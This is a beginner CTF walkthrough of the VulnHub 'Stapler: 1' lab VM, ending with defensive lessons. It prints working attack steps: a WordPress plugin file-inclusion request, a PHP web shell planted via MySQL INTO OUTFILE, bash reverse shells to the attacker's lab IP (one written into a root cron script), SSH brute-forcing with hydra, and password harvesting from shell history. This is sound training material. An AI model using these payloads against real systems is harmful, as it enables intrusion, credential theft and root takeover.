# Stapler: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Stapler: 1 |
| **Difficulty** | Easy / Intermediate |
| **Author** | g0tmi1k |
| **Released** | 2016-06-08 |
| **VulnHub Entry** | <https://vulnhub.com/entry/stapler-1,150/> |
| **Download** | <https://vulnhub.com/entry/stapler-1,150/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu 16.04) |

> A deliberately **enumeration-heavy** box with *many* services and multiple
> documented routes to both a shell and to `root`. The author (g0tmi1k) says
> there are at least two ways to get a limited shell and three ways to get root.
> This walkthrough follows one common chain and flags the alternates. Usernames,
> passwords and banners **vary by build**, so always verify what *your* target
> actually returns.

---

## 0. What you will learn

- How to enumerate a target with **many open services** (FTP, SMB, SSH, Tomcat,
  two web servers, MySQL, DNS).
- How to log in to **anonymous FTP** and read the **banner** for usernames.
- How to enumerate **SMB** shares and users with `smbclient` and `enum4linux`.
- How to enumerate a **WordPress** site with `wpscan` and exploit a plugin for
  **Local File Inclusion** to read `wp-config.php`.
- How to use leaked **MySQL** credentials in **phpMyAdmin** to write a PHP
  web-shell with `SELECT ... INTO OUTFILE`.
- How to obtain a shell as another user (via **SSH key reuse / password reuse**
  and readable home directories).
- How a **world-writable script run by a root cron job** (`cron-logrotate.sh`)
  turns into instant `root`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the "eth0" adapter is the lab NIC)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** the lab NIC holds a `192.168.56.x` (VirtualBox host-only)
> or `192.168.19x.x` (VMware) address. The target is on the **same** subnet.

```bash
# ARP-scan the subnet to list live hosts (fast, uses ARP not TCP)
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:aa:bb:cc, IPv4: 192.168.56.10
Starting arp-scan 1.9.7 with 256 hosts
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:1b:2c:3d       (Unknown)
192.168.56.101  08:00:27:4d:5e:6f       (Unknown)   <-- our target
```

**Target IP:** `192.168.56.101`

![arp-scan finding Stapler at 192.168.56.101](images/01-recon.png)

---

## 2. Enumeration

> **Goal:** fingerprint every open port. There are a *lot* — take notes.

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,53,80,139,443,666,3306,12380 -oA scans/services 192.168.56.101
```

```text
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4
53/tcp    open  domain      dnsmasq 2.75
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X
443/tcp   open  ssl/http    Apache httpd 2.4.18 ((Ubuntu))
666/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
3306/tcp  open  mysql       MySQL 5.7.12
12380/tcp open  ssl/http    Apache httpd 2.4.18 ((Ubuntu))
```

> **How to read it:** each open port is a separate attack surface:
> **FTP** (anonymous?), **SSH**, **DNS**, **SMB**, **MySQL**, and *two* web
> servers (80 and 12380, plus oddballs 443 and 666). We will walk them one at a
> time. Enumerating all of this is the whole point of the box.

### 2.1 Anonymous FTP (port 21)

```bash
ftp 192.168.56.101
# when asked for a name, type: anonymous   (blank password)
```

```text
220-
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-
230 Login successful.
ftp> ls
550 Permission denied.
ftp> get note
226 Transfer complete.
```

> **Why it works:** the FTP server allows **anonymous** logins and its **banner
> leaks a username (`Harry`)**. Directory listing is disabled, but we can still
> `get` the file `note`:

```bash
cat note
```

```text
Elly, make sure you update the note file when you get a chance...
(also references: John)
```

> **How to read it:** we now have candidate **usernames: Harry, Elly, John**.
> Keep them for password reuse / brute-force later.

### 2.2 SMB enumeration (port 139)

```bash
enum4linux -a 192.168.56.101
```

```text
 ==========================
|    Users on 192.168.56.101
 ==========================
user:[peter] rid:[0x3e9]
user:[JKanode] rid:[0x3f0]
user:[SHayslett] rid:[0x401]
...

 =====================
|    Share Enumeration
 =====================
Sharename   Type   Comment
---------   ----   -------
kathy       Disk
tmp         Disk
```

> **Why it works:** SMB (`enum4linux`) often lists **local users** and **shares**
> without any credentials. We now have a big user list and two shares to poke.

```bash
smbclient '\\192.168.56.101\kathy' -U anonymous -N
```

```text
smb: \> ls
  backups\        D        0  ...
smb: \backups\> get vsftpd.conf
```

```text
local_root=/etc
chroot_local_user=YES
```

> **Why it works:** the `kathy` share exposes a backup of `vsftpd.conf`. It tells
> us the FTP server **chroots local users into `/etc`** — meaning that if we can
> log in as *any valid local user*, we can read `/etc/passwd`.

### 2.3 The web servers (ports 80, 666 and 12380)

```bash
curl -s http://192.168.56.101/ | grep -iE "title|href|admin|blog"
gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/admin112233/          (a decoy)
/blogblog/             (a WordPress site!)
/phpmyadmin/           (phpMyAdmin)
```

> **How to read it:** the interesting app is **WordPress at `/blogblog/`** for
> the WordPress database. The full site also lives on the HTTPS server on
> `12380` (`https://192.168.56.101:12380/blogblog/`). We will target it there.

### 2.4 Enumerate WordPress with `wpscan`

```bash
wpscan --url https://192.168.56.101:12380/blogblog/ --disable-tls-checks \
       --enumerate ap,u
```

```text
[+] WordPress theme in use: twentyfifteen
[+] Enumerating plugins (with max threads 5)...
[+] advanced-video-embed
 | Location: .../wp-content/plugins/advanced-video-embed/
[i] No users found... (varies)
```

> **Why it works:** `wpscan` fingerprints the WordPress **version, theme and
> plugins**. The plugin **`advanced-video-embed`** has a known **Local File
> Inclusion / arbitrary-file-read** issue in its `admin-ajax.php` handler.

![wpscan finding the advanced-video-embed plugin](images/03-enum.png)

---

## 3. Foothold

> **Goal:** get a shell. This box has several ways — we cover the WordPress path
> and two alternatives.

### 3.1 Read `wp-config.php` with the plugin LFI

The vulnerable `ave_publishPost` action takes a `thumb` parameter that is
included as a file, and it also writes the result as a “.jpg” into the uploads
folder. Point it at the config file:

```bash
curl -k "https://192.168.56.101:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php"
```

```text
(JSON response containing the wp-config.php source)
```

> **Why it works:** the plugin does not sanitise `thumb`, so `../wp-config.php`
> is read directly and stashed as an image in
> `/blogblog/wp-content/uploads/`. `wp-config.php` holds the **MySQL database
> credentials**:

```text
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');     // value varies by build
define('DB_NAME', 'wordpress');
```

> **How to read it:** we now have MySQL `root` credentials. There are two ways
> to cash them in: log in to **phpMyAdmin**, or open a **MySQL** connection.

### 3.2 Drop a PHP web-shell via phpMyAdmin

Log in to phpMyAdmin (`http://192.168.56.101/phpmyadmin/`) with the creds above,
then run an SQL statement that writes a file into the web root. First confirm
where the uploads folder physically lives (trial and error — it is
`/var/www/https` on this build):

```sql
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/shell.php';
```

> **Why it works:** MySQL's `INTO OUTFILE` writes the query result to a path the
> `mysql` OS user can write. The `uploads` directory is web-readable and has
> **directory listing enabled**, and PHP files there are executed by Apache — so
> we have planted a web-shell.

```bash
curl -k "https://192.168.56.101:12380/blogblog/wp-content/uploads/shell.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now upgrade this into a real reverse shell:

```bash
# On Kali
nc -lvnp 4444
```

```bash
curl -k "https://192.168.56.101:12380/blogblog/wp-content/uploads/shell.php" \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.56.10/4444 0>&1"'
```

```text
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg  ; and:  export TERM=xterm
```

![phpMyAdmin writing the shell and the reverse shell as www-data](images/04-foothold.png)

### 3.3 Alternative foothold — SSH via leaked / reused keys and passwords

The author intends multiple shell routes. Two common ones:

**a) SSH key material left readable.** Because `vsftpd` chroots local users into
`/etc` and several **home directories are world-readable**, once you have low
privileges — or FTP access as a local user — you can read other users' files,
including **`.ssh/id_rsa` private keys**:

```bash
# From a low-priv shell or via FTP (local_root=/etc gives some file reads)
find /home -name id_rsa -o -name "*.key" 2>/dev/null
cat /home/<user>/.ssh/id_rsa
```

```bash
# Use a recovered key on your own machine
chmod 600 id_rsa
ssh -i id_rsa <user>@192.168.56.101
```

> **Why it works:** a private key is a *password that never expires*. If it is
> readable by another user, that user can log in as the key's owner. Key material
> and permissions differ per build, so treat the exact path as
> *varies by build*.

**b) Username-list brute force.** Build a user list from the FTP banner, SMB
enumeration and `/etc/passwd`, then:

```bash
hydra -L users.txt -e nsr ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: SHayslett   password: SHayslett
```

> **How to read it:** `-e nsr` tries the **null** password, the **same** string
> as the username, and the **reverse** of the username. `SHayslett` reused his
> own name as a password. Any of these routes lands you a shell.

---

## 4. Privilege escalation

> **Goal:** go from a low-privilege user to `root`. There are several ways; two
> are shown below.

### 4.1 (Option A) Misconfigured home permissions → credentials → `sudo`

Local enumeration first:

```bash
id; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
ls -la /home
```

```text
drwxr-xr-x  ... /home/JKanode
drwxr-xr-x  ... /home/peter
```

> **How to read it:** the home directories are **world-readable** (the middle
> `r-x` applies to “others”). We can read files we should not, including shell
> history:

```bash
cat /home/JKanode/.bash_history
```

```text
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
```

> **Why it works:** `.bash_history` captures commands *including the passwords
> typed on the command line*. `sshpass -p ...` logged into two accounts, so we
> now have both `JKanode`'s and `peter`'s passwords.

```bash
ssh peter@192.168.56.101        # password: JZQuyIN5  (varies by build)
```

```bash
sudo -l
```

```text
User peter may run the following commands on red:
    (ALL : ALL) ALL
```

> **Why it works:** `peter` is in the `sudo` group and may run **everything** as
> **anyone**. That is a full root grant:

```bash
sudo su
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4.2 (Option B) World-writable script run by a root cron job

Even without finding credentials, `linuxprivchecker.py` (or `LinEnum`) reports a
**world-writable file**:

```bash
python3 linuxprivchecker.py 2>/dev/null | grep -A3 "World Writable"
```

```text
-rwxrwxrwx 1 root root 51 /usr/local/sbin/cron-logrotate.sh
```

```bash
ls -la /usr/local/sbin/cron-logrotate.sh
cat /usr/local/sbin/cron-logrotate.sh
```

```text
#Simon, you really need to-do something about this
```

> **Why it works:** a script that is **writable by everyone** but **executed by
> `root`** (here via a cron entry) is a guaranteed privilege escalation. We
> simply overwrite its contents with commands root will run, then wait for the
> next cron tick (about every 5 minutes).

Replace the script with a reverse shell:

```bash
cat > /usr/local/sbin/cron-logrotate.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.10/443 0>&1
EOF
chmod 777 /usr/local/sbin/cron-logrotate.sh
```

```bash
# On Kali
nc -lvnp 443
```

```text
root@red:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> An equivalent trick is to have the cron job copy and SUID a shell:
> `echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > /usr/local/sbin/cron-logrotate.sh`
> then run `/tmp/rootbash -p` after a few minutes.

### The root flag

```bash
cat /root/flag.txt
```

```text
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
              .-'''''-.
              |'-----'|
      ...  flag contents ...   (varies by build)
                 (ASCII art)
```

![root shell via cron-logrotate.sh and /root/flag.txt](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP + username in banner | vsftpd (port 21) | Username disclosure (`Harry`, `Elly`, `John`) |
| 2 | Over-permissive SMB shares | Samba shares `kathy` / `tmp` | `vsftpd.conf` leak (`local_root=/etc`), user list |
| 3 | Outdated WordPress plugin (LFI) | `advanced-video-embed` | Read `wp-config.php` → MySQL `root` creds |
| 4 | MySQL `FILE` privilege via phpMyAdmin | `SELECT ... INTO OUTFILE` | Web-shell as `www-data` |
| 5 | World-readable home directories | `/home/*`, FTP chroot to `/etc` | Read `.ssh/id_rsa` / `.bash_history` → other users |
| 6 | Weak/reused passwords | SSH | e.g. `SHayslett:SHayslett`, `peter:JZQuyIN5` |
| 7 | Over-permissive sudoers | `peter (ALL : ALL) ALL` | Full `root` |
| 8 | World-writable script run by root cron | `/usr/local/sbin/cron-logrotate.sh` | Full `root` |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** and never leak usernames (banners, motd, error text).
- **Restrict SMB shares** to authenticated users; do not export config backups
  that reveal filesystem layout or credentials.
- **Keep WordPress, its themes and plugins patched**, remove unused plugins, and
  set the classic hardening flags (`DISALLOW_FILE_EDIT`, tight uploads folder
  permissions, no directory listing). Disable `SELECT ... INTO OUTFILE` for
  app DB users and grant only the privileges an app actually needs.
- **Run a web application firewall** and block `../` traversal in plugin input.
- **Fix home directory permissions** (`chmod 700 /home/*`). Never store
  passwords in `.bash_history` — use `sshpass -f`, SSH keys or an agent.
- **Remove world-writable files**, especially any script invoked by root. Audit
  cron with `cron`/`systemd timers` and `find / -perm -o+w -type f`.
- **Apply least privilege to `sudoers`:** list exact commands; never
  `(ALL : ALL) ALL`. Audit with `visudo -c`.
- **Logging/detection:** watch for web-shell creation in `wp-content/uploads/`,
  for `INTO OUTFILE` queries, for unexpected `id_rsa` reads, and for new/modified
  files under `/usr/local/sbin`.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/stapler-1,150/>
- Author's BSidesLondon 2016 slides (design notes / intended paths):
  <https://download.vulnhub.com/media/stapler/>
- Community writeups consulted:
  - [Stapler 1: Vulnhub Walkthrough (Jon Wood)](https://windsorwebdeveloper.com/stapler-1-vulnhub-walkthrough/)
  - [Stapler Vulnhub Writeup (jckhmr)](https://jckhmr.net/stapler-vulnhub-writeup/)
  - [VulnHub – Stapler: 1 Walkthrough (Steflan's Security Blog)](https://steflan-security.com/vulnhub-stapler-1-walkthrough/)
  - [Stapler 1: Vulnhub Walkthrough (Kook Sec)](http://kooksec.blogspot.com/2016/08/stapler-1-vulnhub-walkthough.html)
  - [Stapler Walkthrough (nullcereal)](https://nullcereal.com/2018/11/stapler-walkthrough/)
- Tool / reference docs:
  - [WPScan](https://wpscan.com/)
  - [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)
  - [linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)
  - [LinEnum](https://github.com/rebootuser/LinEnum)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`arp-scan` / `netdiscover`)
- [ ] `images/02-nmap.png` — full service scan (the many open ports)
- [ ] `images/03-enum.png` — FTP/anon banner, SMB enum and `wpscan` plugin finding
- [ ] `images/04-foothold.png` — phpMyAdmin `INTO OUTFILE` web-shell / www-data shell
- [ ] `images/05-shell.png` — reverse shell upgraded to a TTY
- [ ] `images/06-user-flag.png` — `cat /home/JKanode/.bash_history` (credential harvest)
- [ ] `images/07-privesc.png` — `peter` `sudo -l` **or** the writable `cron-logrotate.sh`
- [ ] `images/08-root-flag.png` — root shell and `/root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
